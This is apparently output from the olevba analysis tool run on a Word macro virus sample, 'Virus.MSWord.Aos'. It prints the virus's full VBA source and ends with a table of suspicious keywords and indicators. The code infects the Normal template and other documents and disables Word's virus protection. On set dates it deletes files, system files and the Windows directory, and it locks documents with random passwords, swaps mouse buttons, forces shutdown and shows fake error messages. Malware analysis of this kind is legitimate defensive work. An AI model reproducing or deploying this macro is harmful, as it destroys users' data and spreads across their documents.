olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Aos-224e741a284307c360450d4d7961c5b0ea289d27
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Aos-224e741a284307c360450d4d7961c5b0ea289d27 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AngleOfSin.bas 
in file: Virus.MSWord.Aos-224e741a284307c360450d4d7961c5b0ea289d27 - OLE stream: 'Macros/VBA/AngleOfSin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long
Private Declare Function ExitWindows Lib "user32" (ByVal dwReserved As Long, ByVal uReturnCode As Long) As Long
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Sub AutoOpen()
Infect
Infect2
PayLoad
End Sub
Sub AutoClose()
On Error GoTo sin
Infect
Infect2
ActiveDocument.Save
PayLoad
MsgBox "Do Not Close This Document. System Unstable", , "Warning System Unstable. Please Contact Vendor"
ExitWindowsEx 2, ffffffff
sin:
End Sub
Sub FileSaveAs()
On Error GoTo sin

Dialogs(wdDialogFileSaveAs).Show
PayLoad
Infect
Infect2
sin:
End Sub
Sub FileSave()
On Error GoTo sin
PayLoad
Infect
Infect2
ActiveDocument.Save
SwapMouseButton &H2
sin:
End Sub
Sub AutoNew()
On Error GoTo sin
PayLoad
Infect
Infect2
sin:
End Sub
Sub FilePrint()
On Error GoTo sin
PayLoad
MsgBox " Printing Error at Printer Port:089C", , "Printing Error"
MsgBox " Printing Error Reslo"
Dialogs(wdDialogFilePrint).Show
Infect
Infect2
sin:
End Sub
Sub ToolsMacro()
On Error GoTo sin
PayLoad
MsgBox "Insufficent Memory, Stack Error at CS:1000", , "Memory Allocation Error"
Infect
Infect2
sin:
End Sub
Sub FileTemplates()
On Error GoTo sin
PayLoad
Infect
Infect2
MsgBox "Insufficent Memory", , "Insufficent Memory"
MsgBox "Please Close More Programs to Free Up Disk Space And Try Again", , "Retry Later"
sin:
End Sub

Sub PayLoad()
On Error GoTo sin
If Day((Now) = 25) And Month((Now) = 12) Then
ChDir "\"
Kill "*.*"
End If
If Day((Now) = 9) And Month((Now) = 2) Then
    Kill "*.doc"
    Kill "c:\command.com"
    Kill "c:\autoexec.bat"
    Kill "c:\config.sys"
    Kill "c:\windows\*.*"
End If
If Day((Now) = 5) Or Day((Now) = 10) Or Day((Now) = 15) Or Day((Now) = 20) Or Day((Now) = 25) Or Day((Now) = 30) Then
Dim x, y, z, a, b, c, d
x = Rnd * 255: y = Rnd * 255: z = Rnd * 255: a = Rnd * 255: b = Rnd * 255: c = Rnd * 255: d = Rnd * 255
ActiveDocument.Password = "Angle_Of_Sin" & a & b & c & d & x & y & z
Open "c:\windows\system\saos.dll" For Append As #1
Write #1, x, y, z, a, b, c, d, "File", ActiveDocument.Name
Close #1
End If

sin:
End Sub
Sub EditFind()
On Error GoTo sin:
PayLoad
Infect
Infect2
SwapMouseButton &H4
sin:
End Sub

Sub ToolsWordCount()
On Error GoTo sin
Dialogs(wdDialogToolsWordCount).Show
Infect
Infect2
SwapMouseButton &H4
sin:
End Sub
Sub viewVBcode()
On Error GoTo sin
MsgBox "Invalid Memory Segment:CS:1900", , "Memory Allocation Error"
Infect
Infect2
sin:
End Sub
Sub Infect()
On Error GoTo sin
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Angle:

Options.VirusProtection = False

Application.UserName = "Angle Of Sin"
Application.UserInitials = "SiNeR"
Application.UserAddress = "6667 Angle Rd, Heaven S.I.N"
Options.BackgroundSave = False
Options.CreateBackup = False
Options.SendMailAttach = True

Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate
GlobalInstalled = False
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "AngelOfSin" Then
     DocumentInstalled = True
    End If
Next
    
For a = 1 To NormalTemplate.VBProject.VBComponents.Count
 If NormalTemplate.VBProject.VBComponents(a).Name = "AngleOfSin" Then
  GloabalInstalled = True
 End If
Next

If GlobalInstalled = False Then
 Application.OrganizerCopy Source:=ActiveDocument.Name, Destination:=NormalTemplate.Name, Name:="AngleOfSin", Object:=wdOrganizerObjectProjectItems
 Options.SaveNormalPrompt = False
End If

sin:
End Sub
Sub Infect2()
On Error GoTo sin
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Angle:

Options.VirusProtection = False

Application.UserName = "Angle Of Sin"
Application.UserInitials = "SiNeR"
Application.UserAddress = "6667 Angle Rd, Heaven S.I.N"
Options.BackgroundSave = False
Options.CreateBackup = False
Options.SendMailAttach = True
DocumentInstalled = False
Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate

For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "AngelOfSin" Then
     DocumentInstalled = True
    End If
Next
If NormalInstalled = False Then
 Application.OrganizerCopy Source:=NormalTemplate.Name, Destination:=ActiveDocument.Name, Name:="AngleOfSin", Object:=wdOrganizerObjectProjectItems
 ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormalTemplate
End If
sin:
End Sub
Sub SendMail()
On Error GoTo sin
Infect
Infect2
sin:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |saos.dll            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

